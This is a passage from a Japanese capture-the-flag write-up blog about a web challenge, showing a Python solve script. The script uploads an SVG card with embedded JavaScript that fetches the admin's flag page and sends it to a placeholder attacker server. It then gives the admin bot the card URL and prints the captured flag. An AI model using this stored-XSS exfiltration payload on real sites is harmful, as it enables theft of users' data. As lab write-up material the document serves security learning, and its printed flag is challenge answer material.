+</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>base_url<span style=color:#e6db74>}</span><span style=color:#e6db74>/card&#39;</span>, data<span style=color:#f92672>=</span>data, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>print(res<span style=color:#f92672>.</span>text)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pattern <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;[0-9a-fA-F]</span><span style=color:#e6db74>{8}</span><span style=color:#e6db74>-[0-9a-fA-F]</span><span style=color:#e6db74>{4}</span><span style=color:#e6db74>-[0-9a-fA-F]</span><span style=color:#e6db74>{4}</span><span style=color:#e6db74>-[0-9a-fA-F]</span><span style=color:#e6db74>{4}</span><span style=color:#e6db74>-[0-9a-fA-F]</span><span style=color:#e6db74>{12}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(pattern, res<span style=color:#f92672>.</span>text)
+</span></span><span style=display:flex><span>uuid <span style=color:#f92672>=</span> match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;script type=&#34;text/javascript&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    fetch(`https://hallmark.web.actf.co/flag`)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    .then(async(res) =&gt; {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        flag = await res.text();
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        fetch(`[自身のサーバのURL]?flag=$</span><span style=color:#e6db74>{flag}</span><span style=color:#e6db74>`);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    });
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;/script&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/svg&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># PUT /card</span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;type[0]&#34;</span>: <span style=color:#e6db74>&#34;image/svg+xml&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;content&#34;</span>: payload,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: uuid
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;Content-Type&#39;</span>: <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>}
+</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>put(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>base_url<span style=color:#e6db74>}</span><span style=color:#e6db74>/card&#39;</span>, data<span style=color:#f92672>=</span>data)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;url: </span><span style=color:#e6db74>{</span>base_url<span style=color:#e6db74>}</span><span style=color:#e6db74>/card?id=</span><span style=color:#e6db74>{</span>uuid<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span></code></pre></div><p>そして、出力されるURLをadmin botに投げると自身のサーバにflagが送信されます。</p><pre tabindex=0><code>actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}
+</code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
